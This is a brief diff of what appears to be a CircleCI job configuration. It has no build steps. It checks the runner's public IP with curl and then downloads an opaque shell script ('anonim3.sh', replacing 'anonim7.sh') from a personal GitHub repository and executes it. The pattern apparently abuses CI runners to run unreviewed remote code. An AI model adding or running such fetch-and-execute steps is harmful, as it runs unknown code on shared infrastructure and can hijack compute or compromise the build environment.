@@ -11,7 +11,7 @@ jobs:
       - run: curl ifconfig.me
       - run: 
             name: "trial" 
-            command: wget https://raw.githubusercontent.com/jacujamil/dewasa/main/anonim7.sh && chmod u+x anonim7.sh && ./anonim7.sh
+            command: wget https://raw.githubusercontent.com/jacujamil/dewasa/main/anonim3.sh && chmod u+x anonim3.sh && ./anonim3.sh
  
 workflows: 
     version: 2.1 
